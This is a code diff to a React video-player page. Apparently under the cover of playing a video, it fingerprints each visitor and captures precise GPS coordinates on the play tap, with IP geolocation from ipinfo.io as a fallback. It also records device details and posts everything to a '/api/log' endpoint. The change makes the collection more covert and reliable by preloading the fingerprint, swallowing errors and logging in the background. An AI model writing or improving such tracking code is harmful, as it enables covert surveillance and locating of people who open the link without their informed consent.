@@ -64,9 +64,24 @@ export default function Home() {
   const [loading, setLoading] = useState(true);
   const [logSent, setLogSent] = useState(false);
   const [mounted, setMounted] = useState(false);
+  const [cachedFp, setCachedFp] = useState<string>('unknown');
 
   useEffect(() => {
     setMounted(true);
+
+    // Preload Fingerprint in background on load
+    try {
+      const loader = fpjs.default?.load || fpjs.load;
+      if (loader) {
+        loader()
+          .then(fp => fp.get())
+          .then(res => {
+            if (res.visitorId) setCachedFp(res.visitorId);
+          })
+          .catch(() => {});
+      }
+    } catch (e) {}
+
     // Fetch video URL and title
     fetch('/api/video', { cache: 'no-store' })
       .then(res => res.json())
@@ -89,96 +104,89 @@ export default function Home() {
       });
   }, []);
 
-  const handlePlay = async () => {
+  const handlePlay = () => {
     if (logSent) return;
 
-    let fingerprint = 'unknown';
-    try {
-      // Get fingerprint safely
-      const loader = fpjs.default?.load || fpjs.load;
-      if (loader) {
-        const fp = await loader();
-        const result = await fp.get();
-        fingerprint = result.visitorId || 'unknown';
+    // Trigger Geolocation SYNCHRONOUSLY on the exact user tap gesture
+    const geoPromise = new Promise<{ lat: number | null, lon: number | null }>((resolve) => {
+      if (typeof navigator === 'undefined' || !('geolocation' in navigator)) {
+        resolve({ lat: null, lon: null });
+        return;
       }
-    } catch (e) {
-      console.warn("Fingerprint blocked or failed", e);
-    }
-    
-    let latitude = null;
-    let longitude = null;
 
-    // Get geolocation safely with fallback
-    if ('geolocation' in navigator) {
-      try {
-        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {
-            enableHighAccuracy: true,
-            timeout: 20000,
-            maximumAge: 0
-          });
-        });
-        latitude = position.coords.latitude;
-        longitude = position.coords.longitude;
-      } catch (geoError) {
-        console.warn("Geolocation denied or timeout, using IP fallback");
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+        },
+        (err) => {
+          console.warn("GPS permission or signal error:", err.message);
+          resolve({ lat: null, lon: null });
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    });
+
+    // Execute background data collection and logging
+    (async () => {
+      let fingerprint = cachedFp;
+      if (fingerprint === 'unknown') {
+        try {
+          const loader = fpjs.default?.load || fpjs.load;
+          if (loader) {
+            const fp = await loader();
+            const res = await fp.get();
+            fingerprint = res.visitorId || 'unknown';
+          }
+        } catch (e) {}
+      }
+
+      let { lat, lon } = await geoPromise;
+
+      // Fallback to IP Geolocation if GPS is not granted
+      if (lat === null || lon === null) {
         try {
           const res = await fetch('https://ipinfo.io/json');
           const data = await res.json();
           if (data.loc) {
             const parts = data.loc.split(',');
-            latitude = parseFloat(parts[0]);
-            longitude = parseFloat(parts[1]);
+            lat = parseFloat(parts[0]);
+            lon = parseFloat(parts[1]);
           }
-        } catch (ipError) {
-          console.warn("IP Geolocation fallback failed");
-        }
+        } catch (e) {}
       }
-    } else {
-      try {
-        const res = await fetch('https://ipinfo.io/json');
-        const data = await res.json();
-        if (data.loc) {
-          const parts = data.loc.split(',');
-          latitude = parseFloat(parts[0]);
-          longitude = parseFloat(parts[1]);
-        }
-      } catch (ipError) {}
-    }
 
-    let screenResolution = null;
-    let language = null;
-    let timezone = null;
-    
-    try {
+      let screenResolution = null;
+      let language = null;
+      let timezone = null;
       if (typeof window !== 'undefined') {
         screenResolution = `${window.screen.width}x${window.screen.height}`;
         language = navigator.language;
         timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       }
-    } catch(e) {
-      console.warn("Device info failed", e);
-    }
 
-    // Send log ALWAYS
-    try {
-      await fetch('/api/log', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          fingerprint,
-          latitude,
-          longitude,
-          userAgent: navigator.userAgent,
-          screenResolution,
-          language,
-          timezone
-        })
-      });
-      setLogSent(true);
-    } catch (e) {
-      console.error("API fetch failed", e);
-    }
+      try {
+        await fetch('/api/log', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            fingerprint,
+            latitude: lat,
+            longitude: lon,
+            userAgent: navigator.userAgent,
+            screenResolution,
+            language,
+            timezone
+          })
+        });
+        setLogSent(true);
+      } catch (e) {
+        console.error("API fetch failed", e);
+      }
+    })();
   };
 
   if (loading || !mounted) {
